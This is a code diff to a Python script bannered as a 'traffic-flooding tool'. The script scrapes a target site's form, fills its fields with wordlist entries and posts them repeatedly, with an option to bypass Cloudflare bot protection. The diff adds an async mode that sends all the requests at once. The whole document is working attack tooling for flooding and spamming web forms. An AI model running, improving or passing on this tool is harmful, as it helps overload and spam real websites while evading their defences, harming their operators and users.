@@ -1,12 +1,12 @@
 #!/usr/bin/python
 import requests
 from bs4 import BeautifulSoup as bs
-import time
-import sys, os
+import time, os
 import argparse
 import random
 import cloudscraper
 import itertools
+import asyncio
 
 banner = """
 -=[ traffic-flooding tool ]=-
@@ -28,16 +28,20 @@ parser.add_argument(
     help="bypass cloudflare"
 )
 parser.add_argument(
+    "-a", "--async",
+    action="store_true",
+    dest="async_mode"
+)
+parser.add_argument(
     "-c", "--count",
     type=int,
     default=1000
 )
+args = parser.parse_args()
 
 def pprint(text):
     now = time.strftime("%X")
     print(f"\x1b[1;93m[{now}]\x1b[0m {text}")
-
-args = parser.parse_args()
 
 def wordlist(pos,length,limit):
     words = []
@@ -48,7 +52,14 @@ def wordlist(pos,length,limit):
             words.append(word)
     return words, pos+length
 
-def main():
+async def http_req(session, url, randomdata):
+    r = session.post(url, data=randomdata)
+    if r.status_code == 200:
+        pprint(f"\x1b[1;92m{r.status_code} sent {str(randomdata)} to {args.url}\x1b[0m")
+    else:
+        pprint(f"x1b[1;41;93m{r.status_code} sent {str(randomdata)} to {args.url}\x1b[0m")
+
+async def main():
     session = cloudscraper.CloudScraper() if args.cf else requests.Session()
     r = session.get(args.url)
     soup = bs(r.text, "html5lib")
@@ -86,22 +97,34 @@ def main():
             wcount = 0
             with open(args.wordlist,"r") as fd:
                 wordlen = sum(1 for _ in fd)
-            for _ in range(args.count):
-                filled = {}
-                words, wcount = wordlist(wcount, len(inputname), wordlen)
-                print(words)
-                for name in inputname:
-                    word = random.choice(words)
-                    filled[name] = word.strip()
-                    words.remove(word)
-                r = session.post(url, data=filled)
-                if r.status_code == 200:
-                    pprint(f"\x1b[1;92m{r.status_code} sent {str(filled)} to {args.url}\x1b[0m")
+                if args.async_mode:
+                    tasks = []
+                    for _ in range(args.count):
+                        filled = {}
+                        words, wcount = wordlist(wcount, len(inputname), wordlen)
+                        for name in inputname:
+                            word = random.choice(words)
+                            filled[name] = word.strip()
+                            words.remove(word)
+                        task = asyncio.create_task(http_req(session, url, filled))
+                        tasks.append(task)
+                    await asyncio.gather(*tasks)
                 else:
-                    pprint(f"x1b[1;41;93m{r.status_code} sent {str(filled)} to {args.url}\x1b[0m")
+                    for _ in range(args.count):
+                        filled = {}
+                        words, wcount = wordlist(wcount, len(inputname), wordlen)
+                        for name in inputname:
+                            word = random.choice(words)
+                            filled[name] = word.strip()
+                            words.remove(word)
+                        r = session.post(url, data=filled)
+                        if r.status_code == 200:
+                            pprint(f"\x1b[1;92m{r.status_code} sent {str(filled)} to {args.url}\x1b[0m")
+                        else:
+                            pprint(f"x1b[1;41;93m{r.status_code} sent {str(filled)} to {args.url}\x1b[0m")
 
 if __name__ == "__main__":
     if args.url:
         if args.url.startswith("http"):
             if args.wordlist and os.path.isfile(args.wordlist):
-                    main()
+                    asyncio.run(main())
